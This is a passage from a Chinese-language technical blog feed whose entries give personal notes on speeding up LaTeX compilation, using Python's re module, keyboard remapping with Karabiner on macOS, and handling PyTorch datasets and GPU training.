id="参考资料">参考资料</h2><p><ahref="https://tex.stackexchange.com/questions/523527/edef-hytempb-cite-xrprefix-error-when-citing-same-bibtex-entry-in-exter">hyperref- {}\edef \Hy@tempb {cite.error when citing same bibtex entry in - TeX -LaTeX Stack Exchange</a></p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> latex </category>
          
      </categories>
      
      
        <tags>
            
            <tag> latex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LaTeX 编译原理，如何降低编译时间</title>
      <link href="/blog/2023/02/16/misc/latex/latex_principles/"/>
      <url>/blog/2023/02/16/misc/latex/latex_principles/</url>
      
        <content type="html"><![CDATA[<p>LaTeX 发音：lai tai ke si 或 la tai ke</p><h2 id="latex-四步编译大致原理">LaTeX 四步编译大致原理</h2><p>我画了张编译链接图，简洁明了：</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/latex_complie.png"alt="latex_complie" /><figcaption aria-hidden="true">latex_complie</figcaption></figure><h2 id="如何更快编译---编译效率">如何更快编译 - 编译效率</h2><ol type="1"><li><p>取消压缩,最终版本再压缩 [暂未测试]</p><p>取消 LaTeX 编译器对 PDF 的压缩, 取消压缩后速度提升接近 3 倍, pdf大小增加也很大.</p><p>方法是在 tex 文档开头加入如下代码：</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\special&#123;dvipdfmx:config z 0&#125; %取消PDF压缩，加快速度，最终版本生成的时候最好把这句话注释掉</span><br></pre></td></tr></table></figure></p><p>或</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\pdfcompresslevel=0</span><br><span class="line">\pdfobjcompresslevel=0</span><br></pre></td></tr></table></figure></p></li><li><p>更换系统 - Test Done</p><p>提升 LaTeX 编译器的 I/O 效率,由于该部分和操作系统相关，因此也就是将系统换成 Linux 或者 Mac。</p></li><li><p>使用 LaTeXmk 编译 - Test Done</p><p>推荐使用 latexmk 编译。因为 latexmk 会自动检测编译时需要使用 LaTeX的次数。（比如，当你尝试重复编译一个文档时，latexmk会跳过所有已完成的步骤。）,并且会根据你 LaTeX文档的更改，增量编译，从而加快对原文档进行微小变化后（比如只修改一个字）的编译速度。这相对于四步编译,每次都全量编译快多了.</p><blockquote><p>只改纯文字部分,没有改别的,应该可以直接运行一次 LateX命令搞定?[暂未测试]</p></blockquote></li><li><p><strong>[Recommend]draft 模式</strong> - Test Done</p><p>在有大量图片的情况下,编译速度变慢, 可采用 draft模式,最终版再取消该模式.</p><p>对 documentclass 或 graphicx 加一个 draft 选项:<code>\documentclass[draft]&#123;article&#125;</code> 或<code>\usepackage[draft]&#123;graphicx&#125;</code></p><p>draft 模式下,如果希望看某张图片,可以单独对该图片取消 draft 模式:<code>\includegraphics[draft=false]&#123;image.pdf&#125;</code></p></li><li><p>图片格式选择</p><p>尽量选用 pdf 格式,速度快又清晰</p></li></ol><h2 id="参考">参考</h2><ol type="1"><li><ahref="https://tex.stackexchange.com/questions/121383/how-does-the-latex-compile-chain-work-exactly">Howdoes the LaTeX compile chain work exactly?</a></li><li><ahref="https://bithesis.bitnp.net/Guide/4-Others/Troubleshooting.html#删除-minted-宏包的缓存文件夹">LaTeX疑难杂症</a></li><li><ahref="https://tex.stackexchange.com/questions/51893/turning-off-and-on-images-in-figures">Turningoff and on images in figures</a></li><li><ahref="https://www.overleaf.com/learn/how-to/Optimising_very_large_image_files">Optimisingvery large image files</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> latex </category>
          
      </categories>
      
      
        <tags>
            
            <tag> latex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python re 模块使用</title>
      <link href="/blog/2023/02/16/programming/python/re_usage/"/>
      <url>/blog/2023/02/16/programming/python/re_usage/</url>
      
        <content type="html"><![CDATA[<h2 id="两种使用方式">两种使用方式</h2><h3 id="直接使用-re-模块生成-match-对象">直接使用 re 模块生成 Match对象</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">test = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">hello 12 world</span></span><br><span class="line"><span class="string">Goodbye 224 world</span></span><br><span class="line"><span class="string">h yet anothet &#x27;h&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">pattern = <span class="string">r&quot;\d&#123;1,&#125;&quot;</span></span><br><span class="line">match_obj = re.search(pattern, test)</span><br><span class="line"><span class="built_in">print</span>(match_obj)</span><br><span class="line"><span class="built_in">print</span>(match_obj.group())</span><br></pre></td></tr></table></figure><h3 id="编译-pattern-对象然后用其生成-match-对象">编译 Pattern对象，然后用其生成 Match 对象</h3><p>先使用 <code>re.complie</code> 将模式字符串编译为 pattern对象，然后使用 pattern 对象的 match， search， findall， finditer方法（它们的参数只是相对于 re 自带的方法少了一个模式字符串而已）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">test = &quot;&quot;&quot;</span><br><span class="line">hello 12 world</span><br><span class="line">Goodbye 224 world</span><br><span class="line">h yet anothet &#x27;h&#x27;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">pattern = r&quot;\d&#123;1,&#125;&quot;</span><br><span class="line">pattern_obj = re.compile(pattern)</span><br><span class="line">match_obj = pattern_obj.search(test)</span><br><span class="line">print(match_obj)</span><br><span class="line">print(match_obj.group())</span><br></pre></td></tr></table></figure><h2 id="使用">使用</h2><p>findall 返回列表 ，列表不能 group（）</p><p>注意：match， search等匹配后，需要判断返回对象是否为空，空对象不能执行 match对象的方法们，会报错。</p><h2 id="match-对象的方法">match 对象的方法</h2><p><code>start()</code>：Find starting index position of a group<code>end()</code>: Find last index position of a group<code>group()</code>: Retrieve value of a group by number or name</p><h2 id="find-the-first-match">Find the first match</h2><p><code>match, search</code>, <code>search</code>:只返回第一个满足条件的匹配</p><h2 id="find-all-matches">Find all Matches</h2><p>findall 与 finditer</p><p>findall: find all match in a single call返回匹配列表，直接输出即可。</p><p>finditer: iterate through matches one by one 返回迭代器，通过 for逐个循环迭代，当成 match 对象使用。</p><p>finditer 用来解决 findall 两个缺陷：</p><ol type="1"><li>大量数据搜索时间长，存储的列表数据过大</li><li>不知道每个 match 的位置</li></ol><h2 id="find-and-match-text">Find and Match Text</h2><p>Python 的 re 模块提供了 re.sub 用于替换字符串中的匹配项。</p><p>语法：</p><p>re.sub(pattern, repl, string, count=0, flags=0)</p><p>参数：</p><ul><li>pattern : 正则中的模式字符串。</li><li>repl : 替换的纯字符串(可以引用分组)，也可为一个函数。 Notice: 并不是pattern 模式字符串,只是可以引用而已., 其中 是指 group， 后面跟 number 或name.</li><li>string : 要被查找替换的原始字符串。</li><li>count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">substitution_example</span>():</span><br><span class="line">    pattern = <span class="string">r&quot;(?P&lt;value&gt;\d+(,\d&#123;3&#125;)*(\.\d&#123;2&#125;)?)\s+dollar(s)?&quot;</span></span><br><span class="line"></span><br><span class="line">    replacement_pattern = <span class="string">r&#x27;**USD \g&lt;value&gt;**&#x27;</span></span><br><span class="line"></span><br><span class="line">    text = \</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;Widget Unit cost: 12,000.56 dollars</span></span><br><span class="line"><span class="string">Taxes: 234.00 dollars</span></span><br><span class="line"><span class="string">Total: 12,234.56 dollars&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;Pattern: &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(pattern))</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;---Text:\n&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(text))</span><br><span class="line">    <span class="comment">#successful match</span></span><br><span class="line">    new_text = re.sub(pattern, replacement_pattern, text)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;---New Text:\n&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(new_text))</span><br></pre></td></tr></table></figure><h2 id="inline-option">inline option</h2><p>[python re inlineoption](https://docs.python.org/3/library/re.html#:~:text=currently%20supported%20extensions.-,(%3FaiLmsux),-(One%20or%20more)</p><p><code>(?aiLmsux)</code></p><p>re 模块可以使用 flag 传参, 或者直接使用 inline option</p><p><code>i</code>: 大小写 <code>a</code>: ascii 码 only</p><p>例如:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(?i)d</span><br><span class="line">匹配:</span><br><span class="line">Don&#x27;t d</span><br></pre></td></tr></table></figure><h2 id="single-characters">Single Characters</h2><h3 id="negate-the-whole-range-with">Negate the whole range with ^</h3><ul><li>Problem: Find all occurrence of characters NOT in(a,b,c,d,x,y,z,0,1,2,3)</li><li>Pattern: <code>[^a-dx-z0-3]</code></li></ul><h3 id="escape-character">Escape Character<br /></h3><ul><li>Problem: Find all occurrence of <code>.</code>(dot)</li><li>Pattern：<code>\.</code></li><li>Text: This. is. a text</li></ul><h3id="control-charactertab-newline-carriage-return-and-so-forth">Controlcharacter(tab, newline, carriage return and so forth)</h3><ul><li>Problem: Find all occurrences of tab</li><li>Pattern: </li><li>text: One tab. Two tebs</li></ul><h3 id="set-negation">Set-Negation</h3><ul><li>Problem: Find all occurrence of characters that NOT vowels</li><li>Pattern: <code>[^aeiou]</code></li><li>Text: this is ^ a big test</li></ul><p><code>[^set]</code>: Not in that set, 只要在开头加了 ^,那么这个集合就都是不包含的集合</p><p>例如:<code>[^ae^iou]</code>, 匹配:<strong>T</strong>i<strong>g</strong></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typing, keyboard positions and modifications</title>
      <link href="/blog/2023/02/16/misc/typing_keybroad/"/>
      <url>/blog/2023/02/16/misc/typing_keybroad/</url>
      
        <content type="html"><![CDATA[<p>盲打，这件事自己仿佛也没怎么练习过，打起字来也不记得看不看键盘，但是让自己完全盲打又不是那么确定。</p><p>曾经开始认真练习过一次，后面有事情就忘了，最近整了个蓝牙键盘，又看了看打字，这一次突然明白为什么总是学不会打字了。</p><p>或许这就是契机吧，强迫着，就会了 😄</p><p>Recommended website for Typing Practice，我主要是用前两个:</p><ol type="1"><li><ahref="https://www.typing.com/student/lesson/360/u-r-and-k-keys">TypingLessons | U, R, and K Keys - Typing.com</a></li><li><ahref="https://www.typingclub.com/sportal/program-3.game">edclub</a></li><li><ul class="task-list"><li><label><input type="checkbox" /><a href="https://typing.io/">TypingPractice for Programmers | typing.io</a></label></li></ul></li></ol><h2 id="关于键盘与打字">关于键盘与打字</h2><ol type="1"><li><p>键盘的问题，目前流行的键盘布局本身就是不适合中文打字，而自己又有时候中英混打，更加麻烦。</p><ol type="1"><li>目前的 qwerty布局键盘实际上是个历史遗留问题，不是一个很好的键盘布局，只是商业推广，使用习惯，积重难返罢了。例如大键盘的数字键盘区就是当时对数字的处理需求增大，因此单独设置出来，方便使用的。</li><li>键盘布局是为 alphabet-based language, 例如英语等设计的，而中日韩等character-based language需要在此基础上多一步数字键盘选字的步骤，这就取决于你用的中文输入法的推荐准确度了。</li><li>盲打指法是设计用来正常输入英语文字的，也就是说你击打 tab caps shiftctrl alt [] ;'/，而 99%的时间都应该在击打主键区。<strong>想用来写代码，又或者打中文需要用数字键选词的场景，都不是盲打指法适用的场景。</strong></li></ol></li><li><p>说实话，打字速度早就不是生产力的制约者了，现在写代码大部分都是补全，纯手打的部分有大部分都是固定的单词（public static void main)，剩下的还有多少？</p></li></ol><p>因为代码中含有很多右手小拇指负责的符号，因此本来是非常困难的，但是目前写代码大部分都是自动补全了，纯手打的部分都是一些固定的单词（public void int main）之类的，所以方便多了。</p><p>虽然但是，在没有补全的编辑器，场合中，我右手小拇指盲打符号还是需要继续练习。</p><h2 id="键位修改">键位修改</h2><p>macOS 上可以使用 karabiner-Elements 修改软件键位。</p><h3 id="command-cv">command + c/v</h3><p>如果按照键位的话，对于 macOS 用户，Cmd （ Alt）用无名指来按的话，快捷键基本上打起来很不舒服</p><p>个人打字喜好：CTRL+C 的时候用左手食指按 C。对 Windows键盘而言，CTRL+C 的时候习惯小拇指 ctrl + 食指 cv， 对 macOS键盘而言，复制是 left Command + C ， 左手大拇指 command 配合左手食指c，v</p><p>左手的食指和中指按 C 看自己习惯，我一开始觉得左手食指按 c最方便的，自然,比中指灵活，手指向下轻微一滑就到位置了。后面练着练着中指也灵活一些了，中指按c也可以了。总之习惯就好，感觉键盘的指法只是做了一个分工，适合自己才最好。</p><p>字母 b 左手食指，右手食指都可以，B本来就离两手食指一样距离，谁管都一样</p><h3 id="右边功能键">右边功能键</h3><p>QWERTY键盘布局对小指的要求太高了。按照标准指法，往往很多人的小指太短够不到，找到适合自己的就行，原则就是尽量少移动手掌避免劳累</p><p>我字母键、数字键、左边功能键基本上是标准指法，但是 F键区和右边功能键和退格键太远了。一般有两种处理方式：</p><ol type="1"><li><p>更换键位，把右边常用的键换到左边，例如退格键换到 Caps lock：</p><ol type="1"><li><strong>Caps Lock 键换为单独按时为 delete and backspace，否则为Control</strong>，非常方便。</li></ol></li><li><p>一般都是手部整个移动去按的</p></li></ol><h3 id="上排的数字键">上排的数字键</h3><p>目前我采取的方法 2</p><ol type="1"><li><p>可以将数字键映射到字母区域，通过修改键位和组合键的方式实现。</p><p><ahref="https://github.com/pqrs-org/Karabiner-Elements/issues/127">FN +[789uiojkl] -&gt; NumPad support? · Issue #127 ·pqrs-org/Karabiner-Elements</a></p></li><li><p>学习整个手掌移动与归位</p></li></ol><h3 id="方向键">方向键</h3><p>修改成 vim 的键位，control + hjkl 控制左右上下。 left arrow ischanged to control+h, right arrow is changed to control+l, 结合之前将Caps lock 与别的键一起按下时修改为了 control，就可以按 caps lock 和 hjkl实现左下上右了。</p><h2 id="切换-workspace-快捷键">切换 workspace 快捷键</h2><p>在 mac 的 Mission control 中修改切换 space 的快捷键，改成了 command +left arrow, command + right arrow.</p><p>而 left arrow is changed to control+h, right arrow is changed tocontrol+l, 因此实际上就是 Ctrl+Alt(Command) +h(左)/j(下,Linux)/k(上,Linux)/l(右)，经常使用两个系统（mac 和linux）时操作也方便许多。</p><p>当然，这是在将 caps 换成 backspace when alone pressed, otherwise leftcontrol 的情况下。</p><h2 id="网页浏览快捷键">网页浏览快捷键</h2><ol type="1"><li>更大幅度的滑动网页： Option + 方向箭头</li><li>向下滑动一整页： 空格</li><li>向上滑动一整页： Shift + 空格</li></ol><h2 id="参考">参考</h2><ol type="1"><li><ahref="https://www.v2ex.com/t/891131">突然发现自己一直以错误的方式打字 -V2EX</a></li><li><ahref="https://baijiahao.baidu.com/s?id=1719024120788253466&amp;wfr=spider&amp;for=pc&amp;searchword=%E4%B8%BA%E4%BB%80%E4%B9%88%E6%A0%87%E5%87%86%E9%94%AE%E7%9B%98%E9%94%AE%E4%BD%8D%E5%9E%83%E5%9C%BE%20%E4%B8%8D%E6%8D%A2">键盘上多余的按键，有什么用？</a></li><li><a href="https://www.zhihu.com/question/21079800">怎样在 Mac系统下通过快捷键快速切换桌面？ - 知乎</a></li><li><ahref="https://ke-complex-modifications.pqrs.org/?q=Left%20ctrl%20%2B%20hjkl%20to%20arrow%20keys%20Vim">Karabiner-Elementscomplex_modifications rules</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> typing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>torch dataset 相关函数</title>
      <link href="/blog/2023/02/15/programming/python/pytorch/torch_dataset/"/>
      <url>/blog/2023/02/15/programming/python/pytorch/torch_dataset/</url>
      
        <content type="html"><![CDATA[<p>以 MNIST 举例,</p><ul><li><code>train_dataset.data</code> 获得 feature/image 的 tensor， 其shape 为 <code>torch.Size([60000, 28, 28])</code></li><li><code>train_dataset.targets</code> 获得 label 的 tensor，其 shape 为<code>torch.Size([60000])</code></li><li><code>train_dataset[0]</code> 获得二元组(image,label)表示第一条记录</li><li><code>train_dataset[0][0]</code>，<code>train_dataset[0][1]</code>分别为第一条数据的 image 和 label 对应的 tensor</li></ul><h2 id="数据集独立同分布">数据集独立同分布</h2><p>MINST 数据独立同分布和非独立同分布的代码：</p><p><ahref="https://www.kaggle.com/code/melikedograr0/mnist-dataset-distributed-as-iid-non-iid">MNISTdataset distributed as IID &amp; Non-IID | Kaggle</a></p><p>MNIST 数据集中各类别数目与比例：<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/mnist_percentage.png"alt="Class percentages in MNIST dataset" /> from paper: <ahref="https://www.researchgate.net/publication/320761896">A MinimalSubset of Features Using Feature Selection for Handwritten DigitRecognition</a></p><h2 id="normalize-dataset">Normalize dataset</h2><p>归一化的目的就是使得预处理的数据被限定在一定的范围内（比如 [0,1] 或者[-1,1]），从而消除奇异样本数据导致的不良影响。</p><p>奇异样本数据是指相对于其他输入样本特别大或特别小的样本矢量（即特征向量）</p><p>例如：age 特征一般范围 [0, 100], 工资特征一般范围：[2000, 6000],那么采用梯度下降法训练过程中，寻找最优解的梯度下降过程中，路径就有可能被工资特征的影响所主导，从而导致收敛过程缓慢，甚至收敛效果不好。</p><p>例如下图损失函数的等高线,未归一化的特征会导致损失函数的等高线变成椭圆形状，从而导致梯度下降法收敛过程缓慢，甚至收敛效果不好。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/unnormalized_data.png"alt="unnormalized_data" /><figcaption aria-hidden="true">unnormalized_data</figcaption></figure><p>归一化之后，损失函数的等高线变成圆形，从而导致梯度下降法收敛过程更加平缓，收敛速度加快。<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/normalized_data.png"alt="Normalized Data" /></p><p>数据归一化效果：收敛过程更加平缓，收敛速度加快</p><p>常见数据集 mean std：</p><p>MNIST: mean, std = (0.1307,), (0.3081,) FashionMNIST: mean, std =(0.2861,), (0.3528,) CIFAR10: mean, std = (0.4914, 0.4822, 0.4465),(0.2470, 0.243, 0.261)</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">trans = transforms.Compose([</span><br><span class="line">    transforms.ToTensor(),</span><br><span class="line">    transforms.Normalize((0.4914, 0.4822, 0.4465),</span><br><span class="line">                            (0.2470, 0.243, 0.261)),</span><br><span class="line">])</span><br></pre></td></tr></table></figure><ol type="1"><li><p><code>torch.ToTensor()</code> 将图片转换为 FloatTensor</p><blockquote><p>Converts a PIL Image or numpy.ndarray (H x W x C) in the range [0,255] to a <strong>torch.FloatTensor</strong> of shape (C x H x W) in therange [0.0, 1.0], 将所有数除以 255，将数据归一化到 [0，1]</p></blockquote></li><li><p><code>torch.flatten</code></p><p><code>transforms.Lambda(torch.flatten)</code> 将数据集 flatten成一维</p><p><ahref="https://pytorch.org/vision/main/generated/torchvision.transforms.ToTensor.html">ToTensor— Torchvision main documentation</a></p></li><li><p><code>transforms.Normalize</code></p><p>对应 channel的数据，均值和标准差，运算如下：<code>x = (x - mean) / std</code> 经过transforms.Normalize 数据不一定服从正态分布,结果也不一定都处于 [-1,1]之间</p><p>Normalize:减去均值，除以标准差只是将数据进行标准化处理，并不会改变原始数据的分布。每一个channels 上所有 batch 的数据服从均值为 0，标准差为 1。</p><ol type="1"><li><a href="https://developer.aliyun.com/article/840635">我用 PyTorch复现了 LeNet-5 神经网络（MNIST手写数据集篇）！-阿里云开发者社区</a></li><li><ahref="https://www.cnblogs.com/silence-tommy/p/7113498.html">机器学习笔记：为什么要对数据进行归一化处理？- 不说话的汤姆猫 - 博客园</a></li><li><ahref="https://zhuanlan.zhihu.com/p/424518359">如何理解归一化（normalization）?- 知乎</a></li><li><a href="https://zhuanlan.zhihu.com/p/414242338">pytorch 中归一化transforms.Normalize 的真正计算过程 - 知乎</a></li></ol></li></ol><h2 id="torch-分割数据集-sampler-vs-subset-vs-random_split">Torch分割数据集 sampler vs subset vs random_split</h2><ol type="1"><li><p>如果一直不停使用一个数据集，且需要根据特征使用数据集的不同部分，则使用sampler</p><p>为了避免重复性创建数据集，只针对一个数据集做后续的处理的话，可以采用sampler，而不必采用 subset. You can define a custom sampler for thedataset loader avoiding recreating the dataset (just creating a newloader for each different sampling).</p></li><li><p>定制化获取数据集的子集，后续只用该子集 /只使用大数据集的一部分子集训练</p><p>直接根据原始数据集创建一个 subset 子集即可。</p><p><ahref="https://stackoverflow.com/questions/47432168/taking-subsets-of-a-pytorch-dataset">python- Taking subsets of a pytorch dataset - Stack Overflow</a></p><p>参考：<ahref="http://www.codebaoku.com/it-python/it-python-238136.html">Pytorch继承 Subset 类完成自定义数据拆分 - 编程宝库</a></p><p>动态变化权重的采样器， <ahref="https://github.com/pytorch/pytorch/issues/7359">[feature request][PyTorch] Dynamic Samplers. · Issue #7359 · pytorch/pytorch</a></p></li><li><p>联邦学习中服务端对数据集进行分割，然后分发给 client 从而模拟local model training with the share of data。</p><p>可以采用 `random_split</p><p>random_split(dataset, lengths) works directly on the dataset.</p><p>Two input arguments:</p><ol type="1"><li>The first argument is the dataset.</li><li>The second is a tuple of lengths.</li></ol><p>returns two Datasets with non-overlapping indices, which were drawnrandomly based on the passed lengths, while SubsetRandomSampler acceptsthe indices directly.</p><p>If we want to split our dataset into 2 parts, we will provide a tuplewith 2 numbers. These numbers are the sizes of the correspondingdatasets after the split.</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">train_dataset, val_dataset = random_split(dataset, (<span class="number">6000</span>, <span class="number">899</span>))</span><br></pre></td></tr></table></figure></p><p>It's important to note that in federated learning, both<code>random_split</code> and <code>sampler</code> can be used together,but their roles are slightly different.</p><ol type="1"><li><p><code>random_split</code> is typically used on the server side todivide the global dataset into subsets for clients</p></li><li><p>while <code>sampler</code> is used on the client side to controlthe data sampling strategy during local training</p></li></ol></li><li><p>数据集本地分份，然后使用</p><p>train_dataset 读取了数据集的 dataset 对象。</p><ol type="1"><li><p>[不推荐] 将 tensor split 成 K 个 tensor，</p><p><code>torch.tensor_split(train_dataset.data, K_partitions, dim=0)</code></p></li><li><p>[推荐] 通过 reshape 或者 view 来改变 tensor 的视图</p><p><code>train_dataset.data.reshape((K_partitions, len(train_dataset)//K_partitions, -1))</code></p></li></ol></li></ol><h2 id="change-label-in-dataset">Change label in dataset</h2><p>推荐如下方式，将标签等于 4 的标签设为 0，将标签等于 9 的标签设为 1<code>train_dataset.targets[dataset.targets == 4] = 0</code><code>train_dataset.targets[dataset.targets == 9] = 1</code></p><p>注意对训练集和测试集都要改变 <ahref="https://discuss.pytorch.org/t/change-labels-in-data-loader/36823">Changelabels in Data Loader - vision - PyTorch Forums</a></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pytorch 回归分类常用函数</title>
      <link href="/blog/2023/02/15/programming/python/pytorch/torch_train_skills/"/>
      <url>/blog/2023/02/15/programming/python/pytorch/torch_train_skills/</url>
      
        <content type="html"><![CDATA[<h2 id="torch-训练相关">torch 训练相关</h2><h3 id="pytorch-使用-gpu">Pytorch 使用 GPU</h3><ol type="1"><li><p>设备转换</p><p>2 things must be on GPU: model, tensors, 处于同设备（CPU 或GPU）的数据才能够互相运算，否则需要转换到同一设备</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># For nvidia GPU</span><br><span class="line">cuda_device = torch.device(&quot;cuda&quot; if torch.cuda.is_available() else &quot;cpu&quot;)</span><br><span class="line"></span><br><span class="line"># For arm-based Apple M1&#x27;s GPU</span><br><span class="line">device = torch.device(&quot;mps&quot; if torch.backends.mps.is_available() else &quot;cpu&quot;)</span><br><span class="line"></span><br><span class="line">cpu_device = torch.device(&quot;cpu&quot;)</span><br><span class="line"></span><br><span class="line"># use case</span><br><span class="line">model = model.to(cuda_device)</span><br><span class="line">tensor = tensor.to(device)</span><br><span class="line">model = model.to(cpu_device)</span><br></pre></td></tr></table></figure></p><p><ahref="https://www.deeplearningwizard.com/deep_learning/practical_pytorch/pytorch_logistic_regression/#building-a-logistic-regression-model-with-pytorch-gpu">LogisticRegression - Deep Learning Wizard</a></p></li><li><p><code>torch.cuda()</code> 和<code>tensor.to(torch.device("cuda"))</code> 区别</p><blockquote><p>Early versions of pytorch had <code>.cuda()</code> and<code>.cpu()</code> methods to move tensors and models from cpu to gpuand back. However, this made code writing a bit cumbersome. Laterversions introduced <code>.to()</code> that basically takes care ofeverything in an elegant way:</p></blockquote><p><ahref="https://stackoverflow.com/questions/62907815/pytorch-what-is-the-difference-between-tensor-cuda-and-tensor-totorch-device">python- PyTorch: What is the difference between tensor.cuda() andtensor.to(torch.device("cuda:0"))? - Stack Overflow</a></p><p>推荐使用新版的 <code>tensor.to(torch.device("cuda"))</code></p></li></ol><p>注意：<code>tensor.to()</code> 执行的不是 inplace操作，因此需要赋值；<code>module.to()</code> 执行的是 inplace 操作。</p><h2 id="tensor-在-cpu-与-gpu-之间">tensor 在 cpu 与 gpu 之间</h2><ol type="1"><li><p>想要修改模型参数，然后继续使用：</p><ol type="1"><li>将其从 gpu 拷贝一份，使用： <code>.cpu().detach()</code> 返回 tensor形式 或 <code>.cpu().detach().numpy()</code> 返回 numpy 形式</li><li>然后，对 tensor 或者 numpy 进行修改 最后，将 CPU 中修改的tensor（numpy 需要转换为 tensor）拷贝到 gpu 中去：.cuda() 或.to(device=torch.device('gpu'))</li></ol><p>即使 copy.deepcopy 了 tensor， tensor 也是在 gpu 中的，需要转到cpu</p><p><ahref="https://%20androidkt.com/copy-pytorch-model-using-deepcopy-and-state_dict/">CopyPyTorch Model using deepcopy() and state_dict() - Knowledge Transfer</a><a href="https://zhuanlan.zhihu.com/p/91485607">Pytorch 的 12 个坑 -知乎</a></p></li></ol><h3 id="model.train-和-model.eval">model.train() 和 model.eval()</h3><p><code>model.train()</code>: 在使用 pytorch构建神经网络的时候，训练过程中会在程序上方添加一句model.train()，作用是启用 batch normalization 和 drop out。</p><p><code>model.eval()</code>: 测试过程中会使用model.eval()，这时神经网络会沿用 batch normalization 的值，并不使用 dropout。</p><p>如果模型中有 BN 层 (Batch Normalization)和 Dropout，需要在训练时添加<code>model.train()</code>，在测试时添加 <code>model.eval()</code>。其中model.train()是保证 BN 层用每一批数据的均值和方差，而<code>model.eval()</code> 是保证 BN 用全部训练数据的均值和方差；而对于Dropout，model.train()是随机取一部分网络连接来训练更新参数，而<code>model.eval()</code> 是利用到了所有网络连接。</p><p>如果没有 BN 层 (Batch Normalization)和 Dropout这两种层，就不用写了。</p><p><a href="https://stackoverflow.com/a/66526891">python - What doesmodel.train() do in PyTorch? - Stack Overflow</a> <ahref="https://zhuanlan.zhihu.com/p/254738836">[PyTorch 学习笔记] 7.3使用 GPU 训练模型 - 知乎</a></p><h2 id="小知识">小知识</h2><ol type="1"><li><p><code>Loss.item()</code></p><p>The <code>.item()</code> method extracts the loss’s value as a Pythonfloat, so that you can do some operations, such as sum and averageoperations.</p><p><code>.item()</code> moves the data to CPU. It converts or extractsthe loss’s value as a Python float. and the plain python float numbercan only live on the CPU.</p><p><a href="https://discuss.pytorch.org/t/what-is-loss-item/61218">Whatis loss.item() - autograd - PyTorch Forums</a></p></li><li><p>In Pytorch, when dataset = cifar, the type(dataset.targets) islist</p><p>注意 pytorch 读取 MNIST 读出来的 <code>dataset.targets</code> 是Tensor，但是读取 CIFAR10 读取出来的不是 Tensor，而是 list.统一训练的时候，注意判断</p></li><li><p>Time</p><p>CPU 跑 MNIST 多分类逻辑回归： 6 min 左右 GPU 跑 MNIST多分类逻辑回归： 1min30 min 左右</p></li><li><p>accuracy</p><ol type="1"><li>a binary classification model using logistic regression on MNIST canconverges to 98% accuracy</li><li>a multi-class classification model using logistic regression onMNIST can converges to 92% accuracy</li></ol><p>参考： <ahref="https://stackoverflow.com/questions/45954289/logistic-regression-implementation-with-mnist-not-converging">python- Logistic Regression implementation with MNIST - not converging? -Stack 